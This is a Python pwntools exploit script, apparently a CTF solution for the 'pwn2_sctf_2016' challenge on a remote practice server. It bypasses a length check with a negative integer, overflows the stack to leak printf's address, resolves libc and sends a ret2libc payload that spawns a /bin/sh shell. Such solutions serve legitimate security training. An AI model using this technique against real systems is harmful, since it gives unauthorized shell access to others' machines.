#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher


filename = './pwn2_sctf_2016'
e = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 28911)

vuln = e.sym['vuln']
printf_plt, printf_got = e.plt['printf'], e.got['printf']
log.info(f'printf:plt={hex(printf_plt)}, got={hex(printf_got)}, vuln={hex(vuln)}')

# TODO HINT: Only NUM <= 0x20 is allowed; use a negative integer instead
#   0x0804855a <+43>:    call   0x80483c0 <atoi@plt>
#   0x0804855f <+48>:    mov    %eax,-0xc(%ebp)
#   0x08048562 <+51>:    cmpl   $0x20,-0xc(%ebp)
#   0x08048566 <+55>:    jle    0x804857d <vuln+78>
p.sendline(b'-1')

ra_offset = 0x2c + 4
payload_leak = b'0' * ra_offset + p32(printf_plt) + p32(vuln) + p32(printf_got)
p.sendline(payload_leak)


p.recvuntil(b'You said: ')
content = p.recvline()
log.debug(f'content={content}')

print_addr = u32(p.recv(4).ljust(4, b'\x00'))
log.success(f'print addr={hex(print_addr)}')

searcher = LibcSearcher()
searcher.add_condition('printf', print_addr)
base_addr = print_addr - searcher.dump('printf')
system_addr = base_addr + searcher.dump('system')
bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
log.success(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={bin_sh_addr}')

p.sendline(b'-1')
payload = b'1' * ra_offset + p32(system_addr) + p32(vuln) + p32(bin_sh_addr)
p.sendline(payload)
p.interactive()
